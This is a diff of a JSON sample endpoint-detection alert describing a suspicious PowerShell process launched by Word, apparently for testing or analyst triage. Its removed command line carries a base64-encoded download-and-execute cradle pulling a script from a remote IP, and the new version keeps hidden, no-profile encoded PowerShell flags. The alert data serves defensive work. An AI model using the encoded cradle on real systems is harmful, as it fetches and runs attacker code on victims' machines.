@@ -1,16 +1,15 @@
 {
-  "alert_id": "ENDPT-002",
+  "alert_id": "EDR-002",
   "alert_name": "Suspicious PowerShell Execution",
   "severity": "High",
-  "source": "EDR",
-  "timestamp": "2026-02-19T14:10:00Z",
-  "hostname": "FINANCE-PC-22",
-  "username": "jsmith",
+  "source": "Endpoint Detection & Response",
+  "timestamp": "2026-02-19T15:22:41Z",
+  "host": "FINANCE-LT-204",
+  "user": "asmith",
   "process_name": "powershell.exe",
   "parent_process": "winword.exe",
-  "command_line": "powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnaAB0AHQAcAA6AC8ALwA0ADUALgA4ADMALgAyADEALgAxADkALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==",
-  "sha256": "8c14f0c9a92caa1d9e7a1e45f3b41dcb77f9d77a9f7e8c9b1c2d3e4f5a6b7c8d",
-  "destination_ip": "45.83.21.19",
-  "destination_port": 80,
-  "action": "Process Created"
+  "command_line": "powershell.exe -nop -w hidden -enc SQBmACgAJABlAG4AdgA6AFUAcwBlAHIATgBhAG0AZQApAA==",
+  "network_connection": "185.203.118.44:443",
+  "action_taken": "Alert Generated"
 }
+
